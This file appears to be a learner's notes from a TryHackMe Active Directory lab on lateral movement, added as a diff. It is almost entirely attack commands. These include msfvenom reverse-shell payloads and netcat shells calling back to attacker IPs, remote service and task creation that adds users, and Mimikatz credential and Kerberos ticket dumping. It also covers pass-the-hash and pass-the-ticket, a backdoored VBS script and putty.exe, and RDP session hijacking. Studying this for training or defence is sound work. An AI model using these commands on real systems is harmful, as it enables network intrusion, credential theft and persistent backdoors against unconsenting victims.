@@ -1,0 +1,196 @@
+Local Administrators can only use RDP
+Domain Admins can use RPC, SMB, WinRM
+
+Spawning Processes Remotely:
+Psexec: 
+	• Through Port 445 (SMB)
+	• Required group: Administrators
+	• Sysinternals tool, Download link -> https://learn.microsoft.com/en-us/sysinternals/downloads/psexec
+	• psexec64.exe \\<MachineIP -u <username> -p <password> -i cmd.exe
+WinRM:
+	• Port 5985 or 5986 for WINRM through HTTP or HTTPS respectively
+	• Required group: Remote Management Users
+	• winrs.exe -u:<username> -p:<password> -r:<targetIP> cmd
+SC:
+	• Ports 135,445,139 (RPC)
+	• Required groups: Administrators
+	• sc.exe \\IP create <serviceName> binPath= "net user <usernameToCreate> <passwordForUser> /add" start= auto
+	• sc.exe \\IP start <serviceName>
+Schtasks:
+	• schtasks /s <TARGET> /RU "SYSTEM" /create /tn "<taskName>" /tr "<command/payload to execute>" /sc ONCE /sd 01/01/1970 /st 00:00 
+	• schtasks /s <TARGET> /run /TN "<serviceName>" 
+
+Reverse Shell using SC:
+#msfvenom payload using exe-service to ensure service executable
+msfvenom -p windows/shell/reverse_tcp -f exe-service LHOST=ATTACKER_IP LPORT=4444 -o <serviceName>.exe
+
+#Loading the malicious executable onto the target machine
+smbclient -c 'put <serviceName>.exe' -U <username> -W ZA '//thmiis.za.tryhackme.com/admin$/' <password>
+
+#Start msfconsole
+Msfconsole
+Use exploit/multi/handler
+Set payload windows/shell/reverse_tcp
+Set lhost
+Set lport
+
+#Spawning second reverse shell since SC.exe does not use credentials
+runas /netonly /user:ZA.TRYHACKME.COM\t1_leonard.summers "c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 4443"
+
+#Use SC attacks from above to start the service and catch the shell
+
+Moving Laterally Using WMI:
+Connecting to WMI From Powershell:
+#Creating PSCredential Object
+$username = '<username>';
+$password = '<password>';
+$securePassword = ConvertTo-SecureString $password -AsPlainText -Force;
+$credential = New-Object System.Management.Automation.PSCredential $username, $securePassword;
+
+#Store session
+$Opt = New-CimSessionOption -Protocol DCOM
+$Session = New-Cimsession -ComputerName <TARGET> -Credential $credential -SessionOption $Opt -ErrorAction Stop
+
+Remote Process Creation Using WMI:
+	• Ports: 135, 5985, 5986
+	• Required Group Membership: Administrators
+#Remotely spawn process using WMI
+$Command = "powershell.exe -Command Set-Content -Path C:\text.txt -Value munrawashere";
+Invoke-CimMethod -CimSession $Session -ClassName Win32_Process -MethodName Create -Arguments @{
+CommandLine = $Command
+}
+
+#On legacy machines the command is different
+wmic.exe /user:<username> /password:<password> /node:<TARGET> process call create "cmd.exe /c calc.exe" 
+
+Creating Services Remotely with WMI:
+	• Ports: 135,5985,5986
+	• Required Group Membership: Administrators
+#Create service using Powershell
+Invoke-CimMethod -CimSession $Session -ClassName Win32_Service -MethodName Create -Arguments @{
+Name = "<serviceName>";
+DisplayName = "<serviceName>";
+PathName = "net user munra2 Pass123 /add"; # YOUR PAYLOAD
+ServiceType = [byte]::Parse("16"); # <Win32OwnProcess : Start service in a new process>
+StartMode = "Manual"
+}
+
+#Handle and start the service
+$Service = Get-CimInstance -CimSession $Session -ClassName Win32_Service -filter "Name LIKE 'serviceName'"
+
+Invoke-CimMethod -InputObject $Service -MethodName StartService
+
+#Stop and delete the service
+Invoke-CimMethod -InputObject $Service -MethodName StopService
+Invoke-CimMethod -InputObject $Service -MethodName Delete
+
+Creating Scheduled Tasks Remotely with WMI:
+	• Ports: 135,49152-65535
+	• Required Group Memberships: Administrators
+#Create and execute scheduled task
+#Payload must be split in Command and Args
+$Command = "cmd.exe"
+$Args = "/c net user munra22 aSdf1234 /add"
+
+$Action = New-ScheduledTaskAction -CimSession $Session -Execute $Command -Argument $Args
+Register-ScheduledTask -CimSession $Session -Action $Action -User "NT AUTHORITY\SYSTEM" -TaskName "<taskName>"
+Start-ScheduledTask -CimSession $Session -TaskName "<taskName>"
+
+#Delete scheduled task
+Unregister-ScheduledTask -CimSession $Session -TaskName "<taskName>"
+
+Installing MSI packages through WMI:
+	• Ports: 135,49152-65635, 5985,5986
+	• Required Group Memberships: Administrators
+#After copying MSI to the target, we can install it
+Invoke-CimMethod -CimSession $Session -ClassName Win32_Product -MethodName Install -Arguments @{PackageLocation = "C:\Windows\myinstaller.msi"; Options = ""; AllUsers = $false}
+
+#Legacy System version
+wmic /node:<TARGET >/user:<DOMAIN\USER> product call install PackageLocation=c:\Windows\myinstaller.msi
+
+Let's Exploit!
+#msfvenom payload for msi
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=<hostIP> LPORT=4445 -f msi > myinstaller.msi
+
+#Transfer the payload using smbclient
+smbclient -c 'put myinstaller.msi' -U <username> -W ZA '//thmiis.za.tryhackme.com/admin$/'
+
+#Start multi/handler on Metasploit
+Msfconsole
+Set lhost <hostIP>
+Set lport 4445
+Set payload windows/x64/shell_reverse_tcp
+Exploit
+
+#Create credentials and session as above in Connecting to WMI using Powershell
+#Use Invoke-CimMethod as shown in Installing MSI packages through WMI.
+
+Use of Alternate Authentication Material
+Pass-theHash:
+#Extracting NTLM hashes from local SAM (No domain user's hashes will be available)
+#Start Mimikatz
+Privilege::debug
+Token::elevate
+Lsadump::sam
+
+#Extracting NTLM hashes form LSASS memory
+#Local users and domain users that have recently logged onto machine
+Privilege::debug
+Token::elevate
+Sekurlsa::msv
+
+#These extracted hashes are used to perform PtH attack
+Token::revert #using elevated token will not work
+Sekurlsa::pth /user:<username> /domain:za.tryhackme.com /ntlm:<ntlmHashOfUser> /run:"c:\tools\nc64.exe -e cmd.exe <attackerIP> 5555" #can be used with any other command
+
+#Passing the Hash using Linux
+#Using RDP
+xfreerdp /v:<VICTIM_IP> /u:<DOMAIN>\\<MyUser> /pth:<NTLM_HASH>
+
+#psexec
+psexec.py -hashes <NTLM_HASH> <DOMAIN>/<MyUser>@<VICTIM_IP>
+
+#WinRM
+evil-winrm -i <VICTIM_IP >-u <MyUser> -H <NTLM_HASH>
+
+Pass-the-Ticket
+#Export Kerberos Tickets
+Privilege::debug
+Sekurlsa::tickets /export
+
+#Inject tickets into current session
+Kerberos::ptt <ticket>
+
+#Check if ticket was injected from cmd
+Klist
+
+Overpass-the-hash / Pass-the-Key
+#Obtain Kerberos encryption keys
+Privilege::debug
+Sekurlsa::ekeys
+
+#Depending on available keys we can run certain reverse shells
+#RC4
+Sekurlsa::pth /user:<username> /domain:<domain> /rc4:<rc4Hash> /run:"c:\tools\nc64.exe -e cmd.exe <attackerIP> 5556"
+
+#AES128
+sekurlsa::pth /user:<username> /domain:<domain> /aes128:<aes128Hash> /run:"c:\tools\nc64.exe -e cmd.exe <attackerIP> 5556"
+
+#AES256
+sekurlsa::pth /user:<username> /domain:<domain> /aes256:<aes256Hash> /run:"c:\tools\nc64.exe -e cmd.exe <attackerIP> 5556"
+
+Abusing User Behavior
+Abusing Writable Shares
+#Backdooring .vbs Scripts
+CreateObject("WScript.Shell").Run "cmd.exe /c copy /Y \\10.10.28.6\myshare\nc64.exe %tmp% & %tmp%\nc64.exe -e cmd.exe <attacker_ip> 1234", 0, True
+
+#Backdooring .exe Files
+msfvenom -a x64 --platform windows -x putty.exe -k -p windows/meterpreter/reverse_tcp lhost=<attacker_ip> lport=4444 -b "\x00" -f exe -o puttyX.exe
+
+RDP Hijacking
+#List current sessions
+Query user
+
+#Any session with Disc state has been left open.
+#Taking over session
+Tscon <id> /dest:rdp-tcp#6
